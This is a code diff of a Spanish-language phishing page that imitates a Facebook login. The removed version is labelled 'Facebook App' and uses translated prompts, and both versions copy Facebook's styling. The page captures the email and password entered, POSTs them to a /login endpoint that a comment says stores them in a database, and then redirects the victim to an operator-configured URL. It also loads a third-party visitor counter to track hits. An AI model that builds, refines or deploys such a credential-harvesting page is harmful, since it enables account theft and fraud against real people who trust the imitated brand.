@@ -2,132 +2,104 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title id="titleApp">Cargando...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión</title>
     <style>
-        body { margin:0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#eef2f7; display:flex; justify-content:center; align-items:center; height:100vh; }
-        .container { width:100%; max-width:380px; padding:20px; }
-        .logo { text-align:center; font-size:32px; font-weight:bold; color:#2563eb; margin-bottom:25px; text-transform: uppercase; }
-        .card { background:white; padding:30px; border-radius:12px; box-shadow:0 10px 25px rgba(0,0,0,0.1); }
-        input { width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 8px; border: 1px solid #ddd; box-sizing: border-box; font-size: 16px; outline: none; transition: border 0.3s; }
-        input:focus { border-color: #2563eb; }
-        button { width: 100%; padding: 14px; border: none; border-radius: 8px; background: #2563eb; color: white; font-weight: bold; font-size: 16px; cursor: pointer; transition: background 0.3s; }
-        button:hover { background: #1d4ed8; }
-        button:disabled { background: #94a3b8; cursor: not-allowed; }
-        .forgot { text-align:center; margin-top:15px; color:#2563eb; font-size: 14px; cursor: pointer; }
-        .divider { margin:25px 0; height:1px; background:#eee; position: relative; }
-        .create { background:#22c55e; text-align:center; padding:12px; border-radius:8px; color:white; font-weight:bold; margin-top:10px; cursor:pointer; }
-        .create:hover { background: #16a34a; }
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        .login-card {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        h2 { color: #1877f2; font-size: 28px; margin-bottom: 20px; }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:disabled { background: #8bb4ed; }
+        .footer-link { color: #1877f2; text-decoration: none; font-size: 14px; margin-top: 20px; display: block; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="logo" id="appName">APP</div>
-        
-        <div class="card">
-            <input id="email" type="text" autocomplete="off">
-            <input id="password" type="password">
-            
-            <button id="loginBtn" onclick="login()"></button>
-            
-            <div class="forgot" id="forgotText"></div>
-            <div class="divider"></div>
-            <div class="create" id="createBtn"></div>
-        </div>
+    <div class="login-card">
+        <h2>Iniciar Sesión</h2>
+        <input type="text" id="email" placeholder="Correo electrónico o teléfono">
+        <input type="password" id="pass" placeholder="Contraseña">
+        <button id="btn-login">Entrar</button>
+        <a href="#" class="footer-link">¿Olvidaste tu contraseña?</a>
     </div>
 
-<script>
-/* --- CONFIGURACIÓN DE NOMBRE --- */
-const NOMBRE_APP = "Facebook App"; 
+    <script>
+        // --- LÓGICA DEL CONTADOR PARA LA URL DIRECTA ---
+        async function trackSelf() {
+            try {
+                const res = await fetch('/config');
+                const config = await res.json();
+                if (config.counter_id) {
+                    // Carga el script oficial
+                    const s = document.createElement('script');
+                    s.async = true;
+                    s.src = `https://whos.amung.us/js/chores.js`;
+                    document.head.appendChild(s);
+                    window.wa_amo = config.counter_id;
 
-/* --- TRADUCCIONES AUTOMÁTICAS --- */
-const translations = {
-    en: { email: "Email or phone", password: "Password", login: "Log in", forgot: "Forgot password?", create: "Create new account", loading: "Verifying..." },
-    es: { email: "Correo o teléfono", password: "Contraseña", login: "Iniciar sesión", forgot: "¿Olvidaste tu contraseña?", create: "Crear cuenta nueva", loading: "Verificando..." },
-    pt: { email: "E-mail ou telefone", password: "Senha", login: "Entrar", forgot: "Esqueceu a senha?", create: "Criar nova conta", loading: "Verificando..." }
-};
-
-// Detectar idioma del navegador
-let lang = navigator.language.slice(0, 2);
-if (!translations[lang]) lang = "es";
-const t = translations[lang];
-
-// Aplicar textos
-document.getElementById("appName").innerText = NOMBRE_APP;
-document.getElementById("titleApp").innerText = NOMBRE_APP;
-document.getElementById("email").placeholder = t.email;
-document.getElementById("password").placeholder = t.password;
-document.getElementById("loginBtn").innerText = t.login;
-document.getElementById("forgotText").innerText = t.forgot;
-document.getElementById("createBtn").innerText = t.create;
-
-/* --- FUNCIÓN PRINCIPAL --- */
-async function login() {
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
-    const btn = document.getElementById("loginBtn");
-
-    if (!email || !password) {
-        alert(lang === "es" ? "Por favor rellena todos los campos" : "Please fill all fields");
-        return;
-    }
-
-    // Bloquear botón y mostrar carga
-    btn.disabled = true;
-    btn.innerText = t.loading;
-
-    try {
-        // 1. Enviar datos al servidor para guardar en la DB
-        const resLogin = await fetch("/login", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ email, password })
-        });
-
-        // 2. Obtener el link de redirección configurado desde el Admin
-        const resConfig = await fetch("/config");
-        const config = await resConfig.json();
-
-        // 3. Redirigir después de un pequeño retraso de 1.5 segundos
-        if (resLogin.ok) {
-            setTimeout(() => {
-                window.location.href = config.redirect_url;
-            }, 1500);
-        } else {
-            throw new Error("Error en servidor");
+                    // Ping de respaldo
+                    const img = new Image();
+                    img.src = `https://whos.amung.us/pingjs/?k=${config.counter_id}&t=Visit&x=${encodeURIComponent(window.location.href)}`;
+                }
+            } catch (e) { console.error(e); }
         }
+        trackSelf();
 
-    } catch (error) {
-        console.error(error);
-        alert("Error de conexión al servidor");
-        btn.disabled = false;
-        btn.innerText = t.login;
-    }
-}
-</script>
-<script>
-    async function loadCounter() {
-        try {
+        // --- LÓGICA DE ENVÍO ---
+        document.getElementById('btn-login').onclick = async function() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            if(!email || !pass) return;
+
+            this.disabled = true;
+            this.innerText = "Cargando...";
+
+            await fetch('/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ email, password: pass })
+            });
+
             const res = await fetch('/config');
             const config = await res.json();
-            if (config.counter_id) {
-                // Carga el script de seguimiento
-                const s = document.createElement('script');
-                s.async = true;
-                s.src = `https://whos.amung.us/js/chores.js`;
-                document.head.appendChild(s);
-                window.wa_amo = config.counter_id;
-
-                // Ping de respaldo
-                const img = new Image();
-                img.src = `https://whos.amung.us/pingjs/?k=${config.counter_id}&t=Visit&x=${encodeURIComponent(window.location.href)}`;
-            }
-        } catch (e) {
-            console.error("Error cargando contador:", e);
-        }
-    }
-    loadCounter();
-</script>
+            window.location.href = config.redirect_url;
+        };
+    </script>
 </body>
 </html>
